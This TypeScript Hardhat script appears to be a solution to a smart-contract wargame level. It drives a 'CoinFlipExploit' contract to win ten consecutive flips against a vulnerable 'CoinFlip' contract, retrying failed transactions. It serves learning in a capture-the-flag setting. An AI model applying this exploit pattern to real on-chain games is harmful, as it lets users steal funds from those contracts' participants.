import "@ethersproject/abstract-provider"
import { BigNumber } from "ethers";
import { deployments, ethers } from "hardhat"


import * as dotenv from 'dotenv'
dotenv.config()


const executeExploit= async()=>{
    const coinFlipExploitDeployment=await deployments.get('CoinFlipExploit')
    const coinFlipExploit = await ethers.getContractAt('CoinFlipExploit',coinFlipExploitDeployment.address)
    const coinFlipContract= await ethers.getContractAt('CoinFlip',process.env.COINFLIP_ADDRESS as string)
    
    
    const flip=async()=>{
        const transaction=await coinFlipExploit.flip()
        const transactionReceipt =await transaction.wait() //Wait until block is mined
            if(transactionReceipt.status===0){
                console.log("Fliping the coin failed")
                await flip() //Resend if fail
            }
        
    }
    
    const from=((await coinFlipContract.consecutiveWins()) as BigNumber).toNumber()
    for(let i = from; i<10; i++){
        console.log(`Flip nÂ° ${i+1}`)
        await flip()
        const consecutiveWins=(await coinFlipContract.consecutiveWins()) as BigNumber
        console.log(`Consecutive wins ${consecutiveWins.toNumber()}`)
    }
}

executeExploit().then(()=>process.exit(0)).catch(err=>console.log(err))
